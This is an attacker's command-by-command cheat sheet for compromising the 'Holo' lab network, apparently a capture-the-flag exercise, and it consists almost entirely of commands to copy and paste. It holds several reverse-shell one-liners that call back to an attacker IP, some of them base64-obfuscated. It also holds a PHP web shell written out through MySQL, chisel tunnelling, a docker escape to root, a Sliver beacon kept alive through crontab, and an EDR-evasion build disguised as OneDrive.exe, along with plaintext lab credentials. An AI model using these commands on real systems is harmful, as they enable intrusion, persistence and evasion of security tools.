# Holo CMD-by-CMDs

```bash
sed -i 's/10.50.104.57/10.50.104.57/g' *-CMD-by-CMDs.md

ls -1 Screenshots | awk '{print"![]("$1")"}'
```

```bash
echo "10.200.107.33 www.holo.live admin.holo.live dev.holo.live" | sudo tee -a /etc/hosts

# login in to 
http://admin.holo.live/index.php
# admin:DBManagerLogin!
http://admin.holo.live/dashboard.php?cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.104.57/8443+<%261'



# chisel for linux and windows
go build -ldflags="-s -w" 
# Build for windows
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
upx chisel

mv chisel chisel.lin
mv chisel chisel.win

curl http://10.50.104.57/chisel.lin -o chisel.lin
chmod +x chisel.lin
# Setup server
./chisel.lin server --host 10.50.104.57 --port 10000 --reverse
# chisel client
nohup ./chisel.lin client 10.50.104.57:10000 R:socks &
# Edit /etc/proxychains4.conf
sock5 127.0.0.1 1080
# BEWARE THE COPY AND PASTA for the shell injection
proxychains mysql -h 192.168.100.1 -u admin -p
# !123SecureAdminDashboard321!
use DashboardDB;
# required create RCE on docker host
# if it does not exist
# BEWARE copy first line and type the second!!!
select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/nvmcmd.php';
exit

rlwrap ncat -lvnp 8444

proxychains curl "http://192.168.100.1:8080/nvmcmd.php?cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.104.57/8444+<%261'"

docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh

generate beacon --mtls 10.50.104.57:8445 --arch amd64 --os linux --save /home/kali/Holo-2024/sliver.lsrv -f shellcode -G
# sliver listener
mtls -L  10.50.104.57 -l 8445 

CT="1 * * * *  root /root/sliver.nvm"
echo "$CT" | tee -a /etc/crontab

ssh linux-admin@
# linuxrulez
```


ScareCrow and `upx` for the CTF-level bypass of EDR - [Alh4zr3d](https://www.youtube.com/@alh4zr3d3)
```bash
# Generate sliver beacon shellcode disabling shikata ga nai
generate beacon --mtls  10.50.104.57:8446 --arch amd64 --os windows --save /tmp/8446-sliver.win -f shellcode -G
# use 
/opt/ScareCrow/ScareCrow -I /tmp/8446-sliver.win -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
# Add For static without c runtime libraries
# Build with golang
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
cp $JibberishName OneDrive.exe
# Pack with upx
upx OneDrive.exe
```

```go
execute -o bash -c 'echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuNTAuMTA0LjU3Lzg0NDQgPCYxJwo=| base64 -d | bash'
```

```
nohup bash -c 'echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuNTAuMTA0LjU3Lzg0NDQgPCYxJwo=| base64 -d | bash' &
```


